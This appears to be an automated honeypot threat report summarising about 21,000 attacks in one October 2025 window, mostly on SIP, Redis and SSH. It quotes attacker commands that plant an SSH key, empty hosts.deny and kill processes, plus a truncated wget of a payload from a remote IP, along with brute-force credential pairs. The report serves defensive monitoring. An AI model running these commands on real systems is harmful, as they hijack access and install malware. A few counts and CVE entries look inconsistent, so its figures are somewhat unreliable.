Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-14T23:01:38Z
**Timeframe:** 2025-10-14T22:20:01Z to 2025-10-14T23:01:38Z
**Files Used:**
- agg_log_20251014T222001Z.json
- agg_log_20251014T224001Z.json
- agg_log_20251014T230001Z.json

**Executive Summary**

This report summarizes 21,581 attacks recorded by honeypots between 22:20 UTC and 23:01 UTC on October 14, 2025. The majority of attacks were captured by the Cowrie honeypot. The most prominent attacking IP address was 47.251.171.50. Attackers primarily targeted ports 5060 (SIP) and 6379 (Redis). A number of CVEs were targeted, with CVE-2002-0013 and CVE-2002-0012 being the most frequent. Attackers attempted various commands, many of which were related to establishing SSH access and downloading malware.

**Detailed Analysis**

***Attacks by Honeypot***
- Cowrie: 7620
- Honeytrap: 4123
- Sentrypeer: 3920
- Redishoneypot: 2032
- Ciscoasa: 1813
- Suricata: 1692
- ssh-rsa: 136
- Mailoney: 84
- Adbhoney: 42
- Tanner: 37
- Honeyaml: 34
- H0neytr4p: 36
- Dionaea: 7
- ConPot: 2
- Dicompot: 3

***Top Attacking IPs***
- 47.251.171.50: 2569
- 185.243.5.146: 1441
- 206.191.154.180: 1318
- 185.243.5.148: 925
- 45.78.192.86: 436
- 104.218.165.175: 356
- 172.86.95.98: 428
- 172.86.95.115: 423
- 88.210.63.16: 417
- 185.243.5.121: 396

***Top Targeted Ports/Protocols***
- 5060: 3920
- 6379: 2032
- 22: 1067
- 5903: 190
- 8333: 114
- 25: 86
- 5908: 85
- 5909: 83
- 5901: 83
- 9000: 41

***Most Common CVEs***
- CVE-2002-0013 CVE-2002-0012: 8
- CVE-2019-11500 CVE-2019-11500: 8
- CVE-2021-3449 CVE-2021-3449: 4
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 2
- CVE-2001-0414: 1

***Commands Attempted by Attackers***
- cd ~; chattr -ia .ssh; lockr -ia .ssh: 38
- lockr -ia .ssh: 38
- cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa ... mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~: 38
- cat /proc/cpuinfo | grep name | wc -l: 38
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}': 38
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}': 38
- ls -lh $(which ls): 38
- which ls: 38
- crontab -l: 38
- w: 38
- uname -m: 38
- cat /proc/cpuinfo | grep model | grep name | wc -l: 38
- top: 38
- uname: 38
- uname -a: 37
- whoami: 37
- lscpu | grep Model: 37
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}': 37
- Enter new UNIX password: : 21
- Enter new UNIX password:": 16
- rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;: 8

***Signatures Triggered***
- ET DROP Dshield Block Listed Source group 1: 386
- 2402000: 386
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 248
- 2023753: 248
- ET SCAN NMAP -sS window 1024: 177
- 2009582: 177
- ET HUNTING RDP Authentication Bypass Attempt: 104
- 2034857: 104
- ET INFO Reserved Internal IP Traffic: 59
- 2002752: 59

***Users / Login Attempts***
- root/: 136
- 345gs5662d34/345gs5662d34: 35
- root/Password@2025: 22
- root/123@@@: 19
- root/Qaz123qaz: 16
- root/3245gs5662d34: 17
- unknown/unknown2010: 6
- nobody/nobody777: 6
- blank/1qaz2wsx: 6
- unknown/777: 6
- debian/qwerty123456: 6

***Files Uploaded/Downloaded***
- arm.urbotnetisass;: 2
- arm.urbotnetisass: 2
- arm5.urbotnetisass;: 2
- arm5.urbotnetisass: 2
- arm6.urbotnetisass;: 2
- arm6.urbotnetisass: 2
- arm7.urbotnetisass;: 2
- arm7.urbotnetisass: 2
- x86_32.urbotnetisass;: 2
- x86_32.urbotnetisass: 2
- mips.urbotnetisass;: 2
- mips.urbotnetisass: 2
- mipsel.urbotnetisass;: 2
- mipsel.urbotnetisass: 2
- soap-envelope: 1
- addressing: 1
- discovery: 1
- devprof: 1
- soap:Envelope>: 1

**Key Observations and Anomalies**

- A significant number of commands are focused on downloading and executing payloads, particularly from IP addresses starting with 8.219, 8.222, and 47.237. These appear to be coordinated attacks from the same threat actor.
- The command `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/...` indicates attempts to infect Android devices.
- Attackers are consistently attempting to add their SSH key to the authorized_keys file, indicating a focus on maintaining persistent access.
- The high volume of traffic to port 5060 suggests widespread scanning for vulnerable SIP services.
